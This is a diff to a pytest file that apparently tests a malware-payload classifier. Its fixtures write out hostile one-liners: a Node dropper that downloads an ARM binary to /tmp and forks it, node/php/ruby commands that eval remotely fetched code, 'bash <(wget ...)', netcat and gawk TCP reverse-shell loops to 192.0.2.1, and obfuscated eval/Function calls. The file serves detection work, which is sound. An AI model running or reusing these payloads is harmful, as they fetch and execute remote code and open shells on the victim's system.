@@ -98,6 +98,43 @@ REVIEWED_AGAIN = {
     ),
 }
 
+# The third review round: a page whose first line is a failed redirect running `node -e`, the
+# Node stage it fetches, other one-line interpreters, sourcing, raw sockets and code built from
+# text in JavaScript.
+STAGE_TWO = (
+    b'const https=require("https");const fs=require("fs");https.get("' + URL + b'/x.arm7",r=>{'
+    b'const c=[];r.on("data",d=>c.push(d));r.on("end",()=>{fs.writeFile("/tmp/x",Buffer.concat(c)'
+    b',()=>{require(["child","process"].join("_")).fork("/tmp/x")})})});'
+)
+REVIEWED_THIRD = {
+    "page then node -e": (
+        b"<b x\nnode -e \"require('https').get('" + URL + b"/s2.js',r=>{let d='';"
+        b"r.on('data',c=>d+=c);r.on('end',()=>eval(d))})\"\n"
+    ),
+    "node stage two": STAGE_TWO,
+    "node stage two, strict": b'"use strict";' + STAGE_TWO,
+    "page then php -r": b"<p x\nphp -r 'eval(file_get_contents(\"" + URL + b"\"));'\n",
+    "page then ruby -e": b'<p x\nruby -e \'require "open-uri";eval(URI.open("'
+    + URL
+    + b"\").read)'\n",
+    "page then source of a socket": b"<p x\nsource <(nc 192.0.2.1 4444)\n",
+    "page then bash of a download": b"<p x\nbash <(wget -qO- " + URL + b")\n",
+    "page then a sourced file": b"<p x\n. /run/a\n",
+    "page then a sourced home file": b"<p x\nsource ~/.a\n",
+    "page then udp": b"<p x\nexec 3<>/dev/udp/192.0.2.1/53\n",
+    "page then gawk socket": (
+        b"<p x\ngawk 'BEGIN{s=\"/inet/tcp/0/192.0.2.1/4444\";while(1){s|&getline c;print c}}'\n"
+    ),
+    "page then lua -e": b"<p x\nlua -e 'os.execute(\"id\")'\n",
+    "js eval of a variable": b'"use strict";var d=atob(x);eval(d);',
+    "js indirect eval": b'"use strict";var d=atob(x);(0,eval)(d);',
+    "js new Function": b'"use strict";var f=new Function(d);f();',
+    "js Function without new": b'"use strict";var d=atob(x);Function(d)();',
+    "node static import with a write": (
+        b'import https from "https";import fs from "fs";const f=()=>fs.writeFileSync("/tmp/x","");'
+    ),
+}
+
 # Payloads that need no particular word in common, wrapped in each disguise below.
 PAYLOADS = {
     "shell dropper": DROPPER,
@@ -133,6 +170,17 @@ PAYLOADS = {
     "node exec": b"require(m).exec(c)",
     "createwritestream": b'r.pipe(fs.createWriteStream("/run/a"))',
     "function(atob": b"Function(atob(p))()",
+    # Third round: one payload per new sign, each alone.
+    "php -r": b"php -r 'echo 1;'",
+    "ruby -e": b"ruby -e 'puts 1'",
+    "node -e": b"node -e 'console.log(1)'",
+    "process substitution": b"source <(cat /run/a)",
+    "dot source": b". /run/a",
+    "dev udp": b"echo x >/dev/udp/192.0.2.1/53",
+    "gawk inet": b"gawk 'BEGIN{print 1 |& \"/inet/tcp/0/192.0.2.1/1\"}'",
+    "eval of a variable": b"eval(d)",
+    "new Function": b"new Function(d)()",
+    "node write": b'require(m).writeFile("/tmp/x", d)',
 }
 DISGUISES = {
     "html": b"<!doctype html><html><head><title>t</title></head><body>hi</body></html>\n",
@@ -153,6 +201,35 @@ def test_reviewed_cases_keep_a_non_web_kind(name: str) -> None:
 @pytest.mark.parametrize("name", sorted(REVIEWED_AGAIN))
 def test_second_round_cases_keep_a_non_web_kind(name: str) -> None:
     assert identify(REVIEWED_AGAIN[name]).kind not in WEB_KINDS, name
+
+
+@pytest.mark.parametrize("name", sorted(REVIEWED_THIRD))
+def test_third_round_cases_keep_a_non_web_kind(name: str, rules: CompiledRules) -> None:
+    assert identify(REVIEWED_THIRD[name]).kind not in WEB_KINDS, name
+    result = analyze(REVIEWED_THIRD[name], rules=rules)
+    assert result.severity != "info", name
+
+
+def test_the_node_stage_two_keeps_its_next_stage(rules: CompiledRules) -> None:
+    result = analyze(STAGE_TWO, rules=rules)
+    assert [(i.value, i.source) for i in result.iocs if i.kind == "next_url"] == [
+        (URL.decode() + "/x.arm7", "script_url")
+    ]
+
+
+def test_code_from_text_that_every_bundle_has_is_not_a_command() -> None:
+    for js in (
+        b'"use strict";var g=Function("return this")();window.g=g;',
+        b"\"use strict\";var g=new Function('return this')();window.g=g;",
+        b'"use strict";var r=eval("require");window.r=r;',  # a plain string: the bundler idiom
+        b'"use strict";var f=function(a){return a};window.f=f;',
+    ):
+        assert identify(js).kind == "javascript", js
+    page = (
+        b"<!doctype html><html><body><script>var re=/x/;re.exec(s);document.write('x');"
+        b"</script></body></html>"
+    )
+    assert identify(page).kind == "html"
 
 
 @pytest.mark.parametrize("name", sorted(REVIEWED_AGAIN))
